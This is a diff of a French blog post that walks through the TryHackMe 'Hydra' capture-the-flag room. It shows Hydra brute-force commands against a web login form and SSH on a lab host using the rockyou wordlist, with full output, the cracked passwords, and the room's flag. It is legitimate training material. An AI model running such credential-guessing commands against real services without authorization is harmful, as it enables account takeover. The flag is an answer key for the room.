@@ -3,7 +3,7 @@ layout: post
 title: "TryHackMe — Hydra"
 date: 2026-03-14
 categories: [CTF, TryHackMe]
-tags: [hydra, brute-force, ssh, http-post-form, wordlist, rockyou, easy, tryhackme]
+tags: [hydra, brute-force, ssh, http-post-form, wordlist, rockyou]
 difficulty: easy
 platform: tryhackme
 excerpt: "Hydra est un outil puissant de craquage de mots de passe à distance, intégré par défaut dans Kali Linux, utilisé principalement pour des tests d'intrusion éthiques. Son but : tester automatiquement des milliers de combinaisons login/mot de passe jusqu'à trouver la bonne."
@@ -103,7 +103,7 @@ Sur Kali Linux elle est déjà là :
 
 ---
 
-## Flag 1 — Brute force Web (HTTP POST)
+### Flag 1 — Brute force Web (HTTP POST)
 
 On se connecte au site `http://10.130.159.111` et on fait un faux test de connexion pour identifier le message d'erreur et adapter notre commande.
 
@@ -112,44 +112,78 @@ On se connecte au site `http://10.130.159.111` et on fait un faux test de connex
 On voit le message d'erreur `incorrect`. On applique maintenant notre commande Hydra :
 
 ```bash
-hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.130.159.111 http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect" -V
-```
+> hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.130.159.111  http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect" -V
+Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
-```
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-03-23 05:16:39
+[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
+[DATA] attacking http-post-form://10.130.159.111:80/login:username=^USER^&password=^PASS^:F=incorrect
+[ATTEMPT] target 10.130.159.111 - login "molly" - pass "123456" - 1 of 14344399 [child 0] (0/0)
+[ATTEMPT] target 10.130.159.111 - login "molly" - pass "12345" - 2 of 14344399 [child 1] (0/0)
+[ATTEMPT] target 10.130.159.111 - login "molly" - pass "123456789" - 3 of 14344399 [child 2] (0/0)
+.
+.
+.
+[ATTEMPT] target 10.130.159.111 - login "molly" - pass "carlos" - 44 of 14344399 [child 12] (0/0)
+[ATTEMPT] target 10.130.159.111 - login "molly" - pass "jennifer" - 45 of 14344399 [child 13] (0/0)
+[ATTEMPT] target 10.130.159.111 - login "molly" - pass "joshua" - 46 of 14344399 [child 6] (0/0)
 [80][http-post-form] host: 10.130.159.111   login: molly   password: sunshine
 1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-03-23 05:16:51
 ```
 
-On trouve le mot de passe : **sunshine**. On se connecte avec ces identifiants.
+On trouve le mot de passe qui est **sunshine**. On se connecte avec ces identifiants.
 
 ![Connexion réussie]({{ '/assets/images/posts/ctf/tryhackme/hydra/2.png' | relative_url }})
 
 ---
 
-## Flag 2 — Brute force SSH
+### Flag 2 — Brute force SSH
 
 On lance Hydra sur le service SSH :
 
 ```bash
-hydra -l molly -P /usr/share/wordlists/rockyou.txt ssh://10.130.159.111 -V
-```
+> hydra -l molly -P /usr/share/wordlists/rockyou.txt ssh://10.130.159.111 -V
+Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
-```
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-03-23 05:53:55
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399)
+[DATA] attacking ssh://10.130.159.111:22/
+[ATTEMPT] target 10.130.159.111 - login "molly" - pass "123456" - 1 of 14344399 [child 0] (0/0)
+[ATTEMPT] target 10.130.159.111 - login "molly" - pass "12345" - 2 of 14344399 [child 1] (0/0)
+[ATTEMPT] target 10.130.159.111 - login "molly" - pass "123456789" - 3 of 14344399 [child 2] (0/0)
+.
+.
+.
+[ATTEMPT] target 10.130.159.111 - login "molly" - pass "angel" - 34 of 14344401 [child 2] (0/0)
+[ATTEMPT] target 10.130.159.111 - login "molly" - pass "jordan" - 35 of 14344401 [child 3] (0/0)
 [22][ssh] host: 10.130.159.111   login: molly   password: butterfly
 1 of 1 target successfully completed, 1 valid password found
+[WARNING] Writing restore file because 2 final worker threads did not complete until end
+[ERROR] 2 targets did not resolve or could not be connected
+[ERROR] 0 target did not complete
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-03-23 05:54:03
 ```
 
-On trouve le mot de passe : **butterfly**. On se connecte en SSH et on récupère le flag :
+On retrouve le mot de passe **butterfly** et on se connecte en SSH :
 
 ```bash
-ssh molly@10.130.159.111
-# password: butterfly
-
-ls
-# flag2.txt
-
-cat flag2.txt
-# THM{c8eeb0468febbadea859baeb33b2541b}
+> ssh molly@10.130.159.111
+The authenticity of host '10.130.159.111 (10.130.159.111)' can't be established.
+ED25519 key fingerprint is SHA256:otVPVpNsNBMnawP5TKP3RhQPuI4oSQneCeLHUsaliLc.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.130.159.111' (ED25519) to the list of known hosts.
+molly@10.130.159.111's password:
+Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.15.0-1083-aws x86_64)
+.
+.
+> ls
+flag2.txt
+> cat flag2.txt
+THM{c8eeb0468febbadea859baeb33b2541b}
 ```
 
 **Bingo !** 🎉
